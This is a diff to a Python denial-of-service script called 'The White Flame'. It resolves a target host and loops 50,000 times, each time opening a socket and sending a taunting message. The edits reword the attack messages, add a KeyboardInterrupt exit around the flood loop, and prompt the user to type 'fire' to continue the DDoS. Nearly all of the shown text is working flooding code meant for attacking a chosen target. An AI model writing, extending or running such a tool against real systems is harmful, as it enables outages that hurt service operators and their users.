@@ -3,7 +3,7 @@ import time
 import socket
 import os
 import sys
-import string
+# import string
 # The white flame tools
 baner = """
 The White Flame is here...\033[38;5;208m$\033[0m
@@ -55,7 +55,7 @@ port = int(port)
 connect = 50000
 ip = socket.gethostbyname(host)
 print("\033[1;91m Attacking \033[1;93m[" + host + "]")
-print("\033[1;91m Attack to ip \033[1;93m[" + ip + "]")
+print("\033[1;91m Attack to target ip \033[1;93m[" + ip + "]" + "\033[1;91m inbound")
 message = b"WHITE FLAME, THE FLAMING EANGLE SYSTEM WAS HERE..."
 print("\033[1;91mFIRE..............................")
 
@@ -70,14 +70,17 @@ def dos():
         ddos.send(message)
     except socket.error:
         print("\033[1;91m ...no connection to [" + ip + "] ...")
-    print("\033[1;92m ...start sending the coffin to [" + ip + "] ...")
+    print("\033[1;92m ...start sending payloads to [" + ip + "] ...")
     ddos.close()
 
 
 for i in range(1, connect):
-    dos()
-print("Ddos has is stopping.........")
-time.wait(2)
+    try:
+        dos()
+    except KeyboardInterrupt:
+        print("Exiting...")
+        sys.exit()
+print("Ddos is stopping.........")
 if __name__ == "__main__":
     restart_program()
     answer = input("Do you want to continue DDoS ??? Type 'fire'...")
